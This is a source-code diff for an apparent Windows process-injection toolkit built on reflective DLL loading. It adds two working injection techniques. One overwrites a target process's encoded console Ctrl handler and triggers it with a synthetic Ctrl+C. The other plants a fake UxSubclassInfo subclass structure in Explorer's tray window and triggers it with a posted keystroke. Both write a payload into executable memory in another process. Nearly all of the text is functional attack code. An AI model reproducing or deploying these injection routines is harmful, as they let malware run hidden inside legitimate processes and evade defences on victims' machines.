@@ -210,7 +210,7 @@ void WINAPI LoadRemoteLibraryR4(int payload_type, HANDLE hProcess, DWORD tid)
 	CONTEXT old_ctx, new_ctx;
 	HANDLE tp;
 	LPVOID lpRemoteLibraryBuffer = NULL;
-	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	DWORD64 lpReflectiveLoader = NULL;
 
 
 	set_param(payload_type);
@@ -233,7 +233,7 @@ void WINAPI LoadRemoteLibraryR4(int payload_type, HANDLE hProcess, DWORD tid)
 		}
 
 		// add the offset to ReflectiveLoader() to the remote library address
-		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
+		lpReflectiveLoader = (DWORD64)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
 
 
 		HANDLE thread_handle = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT, FALSE, tid);
@@ -250,7 +250,7 @@ void WINAPI LoadRemoteLibraryR4(int payload_type, HANDLE hProcess, DWORD tid)
 		}
 
 		new_ctx = old_ctx;
-		new_ctx.Rip = (DWORD64)lpReflectiveLoader;
+		new_ctx.Rip = lpReflectiveLoader;
 
 		if (!SetThreadContext(thread_handle, &new_ctx))
 		{
@@ -276,7 +276,7 @@ void WINAPI LoadRemoteLibraryR5(int payload_type)
 {
 
 	LPVOID lpRemoteLibraryBuffer = NULL;
-	LPTHREAD_START_ROUTINE lpReflectiveLoader = NULL;
+	DWORD64 lpReflectiveLoader = NULL;
 	DWORD process_id;
 
 	set_param(payload_type);
@@ -304,7 +304,7 @@ void WINAPI LoadRemoteLibraryR5(int payload_type)
 			return;
 
 		// add the offset to ReflectiveLoader() to the remote library address
-		lpReflectiveLoader = (LPTHREAD_START_ROUTINE)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
+		lpReflectiveLoader = (DWORD64)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
 
 
 		// write the image into the host process
@@ -319,7 +319,7 @@ void WINAPI LoadRemoteLibraryR5(int payload_type)
 		LPVOID target_obj = VirtualAllocEx(h, NULL, sizeof(new_obj), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		new_obj[0] = (DWORD64)target_obj + sizeof(DWORD64); //&(new_obj[1])
 		// output->buffer will be equal to VirtualAllocEx return value in the Writer
-		new_obj[1] = (DWORD64)lpReflectiveLoader;
+		new_obj[1] = lpReflectiveLoader;
 
 		WriteProcessMemory(h, target_obj, new_obj, sizeof(new_obj), NULL);
 		SetWindowLongPtrA(hWindow, 0, (DWORD64)target_obj);
@@ -338,6 +338,226 @@ void WINAPI LoadRemoteLibraryR5(int payload_type)
 }
 
 
+void WINAPI LoadRemoteLibraryR6(int payload_type, HANDLE hProcess)
+{
+
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPVOID lpReflectiveLoader = NULL;
+
+	DWORD process_list[1];
+	DWORD parent_id;
+	void* encoded_addr = NULL;
+	INPUT ip;
+	MODULEINFO modinfo;
+	int size;
+	HWND hWindow;
+
+	DWORD pid = GetProcessId(hProcess);
+	set_param(payload_type);
+
+	try
+	{
+
+		// alloc memory (RWX) in the host process for the image
+		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpRemoteLibraryBuffer)
+			return;
+
+		// write the image into the host process
+		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buf, buflen, NULL))
+		{
+			return;
+		}
+
+
+		// add the offset to ReflectiveLoader() to the remote library address
+		lpReflectiveLoader = (LPVOID)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
+
+
+
+
+
+		NTSTATUS(*PRtlEncodeRemotePointer)(
+			_In_ HANDLE ProcessHandle,
+			_In_ PVOID Pointer,
+			_Out_ PVOID * EncodedPointer
+			) = (NTSTATUS(*)(
+				_In_ HANDLE ProcessHandle,
+				_In_ PVOID Pointer,
+				_Out_ PVOID * EncodedPointer
+				)) GetProcAddress(GetModuleHandleA("ntdll"), "RtlEncodeRemotePointer");
+
+		HMODULE kernelbase = GetModuleHandleA("kernelbase");
+		GetModuleInformation(GetCurrentProcess(), kernelbase, &modinfo, sizeof(modinfo));
+		size = modinfo.SizeOfImage;
+		char* kernelbase_DefaultHandler = (char*)memmem(kernelbase, size, "\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9); // sub rsp,28h; mov ecx,0C000013Ah (STATUS_CONTROL_C_EXIT)
+		__int64 encoded = (__int64)EncodePointer(kernelbase_DefaultHandler);
+		char* kernelbase_SingleHandler = (char*)memmem(kernelbase, size, &encoded, 8);
+
+		GetConsoleProcessList(process_list, 1);
+
+
+		parent_id = process_list[0];
+
+		FreeConsole();
+		AttachConsole(pid);
+		hWindow = GetConsoleWindow();
+		FreeConsole();
+		AttachConsole(parent_id);
+
+		(*PRtlEncodeRemotePointer)(hProcess, lpReflectiveLoader, &encoded_addr);
+		WriteProcessMemory(hProcess, kernelbase_SingleHandler, &encoded_addr, 8, NULL);
+
+		ip.type = INPUT_KEYBOARD;
+		ip.ki.wScan = 0;
+		ip.ki.time = 0;
+		ip.ki.dwExtraInfo = 0;
+		ip.ki.wVk = VK_CONTROL;
+		ip.ki.dwFlags = 0; // 0 for key press
+		SendInput(1, &ip, sizeof(INPUT));
+		Sleep(100);
+		PostMessageA(hWindow, WM_KEYDOWN, 'C', 0);
+
+		// release the Ctrl key
+		Sleep(100);
+		ip.type = INPUT_KEYBOARD;
+		ip.ki.wScan = 0;
+		ip.ki.time = 0;
+		ip.ki.dwExtraInfo = 0;
+		ip.ki.wVk = VK_CONTROL;
+		ip.ki.dwFlags = KEYEVENTF_KEYUP;
+		SendInput(1, &ip, sizeof(INPUT));
+
+		// Restore the original Ctrl handler in the target process
+		(*PRtlEncodeRemotePointer)(hProcess, kernelbase_DefaultHandler, &encoded_addr);
+		WriteProcessMemory(hProcess, kernelbase_SingleHandler, &encoded_addr, 8, NULL);
+
+
+	}
+	catch (...)
+	{
+
+	}
+
+	return;
+}
+
+
+
+void WINAPI LoadRemoteLibraryR7(int payload_type)
+{
+
+	LPVOID lpRemoteLibraryBuffer = NULL;
+	LPVOID lpReflectiveLoader = NULL;
+	LPVOID target_payload;
+
+	char new_subclass[0x50];
+	DWORD pid;
+
+	set_param(payload_type);
+
+	try
+	{
+
+		HWND h = FindWindowA("Shell_TrayWnd", NULL);
+
+		if (h == NULL)
+		{
+			printf("FindWindow failed, error: 0x%08x\n", GetLastError());
+			exit(0);
+		}
+		GetWindowThreadProcessId(h, &pid);
+		//printf("*** pid=%d\n", pid);
+		//printf("[*] Locating sub window\n");
+		HWND hst = GetDlgItem(h, 303); // System Tray
+		if (hst == NULL)
+		{
+			printf("GetDlgItem(1) failed, error: 0x%08x\n", GetLastError());
+			exit(0);
+		}
+		//printf("[*] Locating dialog item\n");
+
+		HWND hc = GetDlgItem(hst, 1504);
+		if (hc == NULL)
+		{
+			printf("GetDlgItem(1) failed, error: 0x%08x\n", GetLastError());
+			exit(0);
+		}
+
+		/* Get Handle to process */
+
+		//printf("[*] Opening process\n");
+		HANDLE p = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+		if (p == NULL)
+		{
+			printf("OpenProcess failed, error: 0x%08x\n", GetLastError());
+			exit(0);
+		}
+
+		// alloc memory (RWX) in the host process for the image
+		lpRemoteLibraryBuffer = VirtualAllocEx(p, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+		if (!lpRemoteLibraryBuffer)
+			return;
+
+		// add the offset to ReflectiveLoader() to the remote library address
+		lpReflectiveLoader = (LPVOID)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
+
+
+		// write the image into the host process
+		if (!WriteProcessMemory(p, lpRemoteLibraryBuffer, buf, buflen, NULL))
+		{
+			return;
+		}
+
+
+		HANDLE target_new_subclass = (HANDLE)VirtualAllocEx(p, NULL, sizeof(new_subclass), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
+		if (target_new_subclass == NULL)
+		{
+			printf("VirtualAllocEx(2) failed, error: 0x%08x\n", GetLastError());
+			exit(0);
+		}
+		//(HANDLE)(((DWORD64)target_payload) + sizeof(payload)); //target memory address for fake subclass structure
+
+		HANDLE old_subclass = GetPropA(hc, "UxSubclassInfo"); //handle is the memory address of the current subclass structure
+
+		if (!ReadProcessMemory(p, (LPCVOID)old_subclass, (LPVOID)new_subclass, sizeof(new_subclass), NULL))
+		{
+			printf("ReadProcessMemory failed, error: 0x%08x\n", GetLastError());
+			exit(0);
+		}
+
+		//printf("[+] Current subclass structure was read to memory\n");
+
+
+		memcpy(new_subclass + 0x18, &lpReflectiveLoader, sizeof(lpReflectiveLoader));
+		//printf("[*] Writing fake subclass to process\n");
+		if (!WriteProcessMemory(p, (LPVOID)(target_new_subclass), (LPVOID)new_subclass, sizeof(new_subclass), NULL))
+		{
+			printf("WriteProcessMemory(2) failed, error: 0x%08x\n", GetLastError());
+			exit(0);
+		}
+
+		//printf("[+] Fake subclass structure is written to memory\n");
+		//printf("[+] Press enter to unhook the function and exit\r\n");
+		//getchar();
+
+		//SetProp(control, "CC32SubclassInfo", h);
+		//printf("[*] Setting fake SubClass property\n");
+		SetPropA(hc, "UxSubclassInfo", target_new_subclass);
+		//printf("[*] Triggering shellcode....!!!\n");
+		PostMessage(hc, WM_KEYDOWN, VK_NUMPAD1, 0);
+
+		Sleep(1);
+		//printf("[+] Restoring subclass header.\n");
+		SetPropA(hc, "UxSubclassInfo", old_subclass);
+	}
+	catch (...)
+	{
+
+	}
+
+	return;
+}
 
 
 //###########################
@@ -366,6 +586,10 @@ DWORD Rva2Offset(DWORD dwRva, UINT_PTR uiBaseAddress)
 
 	return 0;
 }
+
+
+
+
 
 DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer, const char* exportedFuncName)
 {
@@ -448,106 +672,3 @@ DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer, const char* exporte
 }
 
 
-void WINAPI LoadRemoteLibraryR6(int payload_type, HANDLE hProcess)
-{
-
-	LPVOID lpRemoteLibraryBuffer = NULL;
-	LPVOID lpReflectiveLoader = NULL;
-
-	DWORD process_list[1];
-	DWORD parent_id;
-	void* encoded_addr = NULL;
-	INPUT ip;
-	MODULEINFO modinfo;
-	int size;
-	HWND hWindow;
-
-	DWORD pid = GetProcessId(hProcess);
-	set_param(payload_type);
-
-	try
-	{
-
-		// alloc memory (RWX) in the host process for the image
-		lpRemoteLibraryBuffer = VirtualAllocEx(hProcess, NULL, buflen, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-		if (!lpRemoteLibraryBuffer)
-			return ;
-
-		// write the image into the host process
-		if (!WriteProcessMemory(hProcess, lpRemoteLibraryBuffer, buf, buflen, NULL))
-		{
-			return ;
-		}
-
-
-		// add the offset to ReflectiveLoader() to the remote library address
-		lpReflectiveLoader = (LPVOID)((ULONG_PTR)lpRemoteLibraryBuffer + offset);
-
-
-
-
-
-		NTSTATUS(*PRtlEncodeRemotePointer)(
-			_In_ HANDLE ProcessHandle,
-			_In_ PVOID Pointer,
-			_Out_ PVOID * EncodedPointer
-			) = (NTSTATUS(*)(
-				_In_ HANDLE ProcessHandle,
-				_In_ PVOID Pointer,
-				_Out_ PVOID * EncodedPointer
-				)) GetProcAddress(GetModuleHandleA("ntdll"), "RtlEncodeRemotePointer");
-
-		HMODULE kernelbase = GetModuleHandleA("kernelbase");
-		GetModuleInformation(GetCurrentProcess(), kernelbase, &modinfo, sizeof(modinfo));
-		size = modinfo.SizeOfImage;
-		char* kernelbase_DefaultHandler = (char*)memmem(kernelbase, size, "\x48\x83\xec\x28\xb9\x3a\x01\x00\xc0", 9); // sub rsp,28h; mov ecx,0C000013Ah (STATUS_CONTROL_C_EXIT)
-		__int64 encoded = (__int64)EncodePointer(kernelbase_DefaultHandler);
-		char* kernelbase_SingleHandler = (char*)memmem(kernelbase, size, &encoded, 8);
-
-		GetConsoleProcessList(process_list, 1);
-
-
-		parent_id = process_list[0];
-
-		FreeConsole();
-		AttachConsole(pid);
-		hWindow = GetConsoleWindow();
-		FreeConsole();
-		AttachConsole(parent_id);
-
-		(*PRtlEncodeRemotePointer)(hProcess, lpReflectiveLoader, &encoded_addr);
-		WriteProcessMemory(hProcess, kernelbase_SingleHandler, &encoded_addr, 8, NULL);
-
-		ip.type = INPUT_KEYBOARD;
-		ip.ki.wScan = 0;
-		ip.ki.time = 0;
-		ip.ki.dwExtraInfo = 0;
-		ip.ki.wVk = VK_CONTROL;
-		ip.ki.dwFlags = 0; // 0 for key press
-		SendInput(1, &ip, sizeof(INPUT));
-		Sleep(100);
-		PostMessageA(hWindow, WM_KEYDOWN, 'C', 0);
-
-		// release the Ctrl key
-		Sleep(100);
-		ip.type = INPUT_KEYBOARD;
-		ip.ki.wScan = 0;
-		ip.ki.time = 0;
-		ip.ki.dwExtraInfo = 0;
-		ip.ki.wVk = VK_CONTROL;
-		ip.ki.dwFlags = KEYEVENTF_KEYUP;
-		SendInput(1, &ip, sizeof(INPUT));
-
-		// Restore the original Ctrl handler in the target process
-		(*PRtlEncodeRemotePointer)(hProcess, kernelbase_DefaultHandler, &encoded_addr);
-		WriteProcessMemory(hProcess, kernelbase_SingleHandler, &encoded_addr, 8, NULL);
-
-
-	}
-	catch (...)
-	{
-		
-	}
-
-	return ;
-}
